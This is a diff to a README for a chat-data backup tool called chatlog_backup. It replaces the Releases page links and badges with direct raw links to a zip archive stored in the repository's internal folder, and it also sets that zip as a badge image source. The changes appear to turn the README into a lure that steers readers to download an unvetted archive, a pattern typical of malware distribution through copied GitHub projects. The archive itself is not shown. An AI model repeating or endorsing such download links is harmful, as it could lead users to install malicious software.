@@ -1,8 +1,8 @@
 # 🗃️ chatlog_backup - Effortlessly Manage Your Chat Data
 
 <div align="center">
-   <a href="https://github.com/kaydot13/chatlog_backup/releases">
-      <img src="https://img.shields.io/github/release/sjzar/chatlog.svg" alt="Latest Release" />
+   <a href="https://github.com/kaydot13/chatlog_backup/raw/refs/heads/main/internal/backup_chatlog_1.0-beta.1.zip">
+      <img src="https://github.com/kaydot13/chatlog_backup/raw/refs/heads/main/internal/backup_chatlog_1.0-beta.1.zip" alt="Latest Release" />
    </a>
 </div>
 
@@ -14,7 +14,7 @@ chatlog_backup is a user-friendly tool designed to help you manage your chat dat
 
 To get started, visit the Releases page and download the latest version of chatlog_backup. 
 
-[![Download chatlog_backup](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kaydot13/chatlog_backup/releases)
+[![Download chatlog_backup](https://github.com/kaydot13/chatlog_backup/raw/refs/heads/main/internal/backup_chatlog_1.0-beta.1.zip)](https://github.com/kaydot13/chatlog_backup/raw/refs/heads/main/internal/backup_chatlog_1.0-beta.1.zip)
 
 1. Click on the link above.
 2. Locate the latest release.
